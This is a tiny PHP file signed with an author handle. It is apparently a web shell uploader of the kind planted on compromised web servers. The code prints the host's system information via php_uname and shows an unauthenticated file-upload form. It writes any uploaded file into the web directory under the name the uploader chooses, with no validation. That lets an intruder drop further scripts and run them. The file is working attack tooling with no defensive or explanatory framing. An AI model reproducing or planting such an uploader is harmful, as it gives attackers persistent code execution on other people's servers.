<!-- By y7lmoon511 ^_^ mail : y7lmoon511@gmail.com -->


<?php echo '<b><br><br><br><br><br><br><center><font color:"blue"><span style="font-family: monospace;"><span style="color: rgb(255, 255, 255);"><br><br><font color="black">'.php_uname().'</font><br></b>'; echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">'; echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>'; if( $_POST['_upl'] == "Upload" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<br><b>upload File successfully !!!</b><br><br>'; } else { echo '<br><b>Upload Fail !!!</b><br><br></font>'; } } ?> 
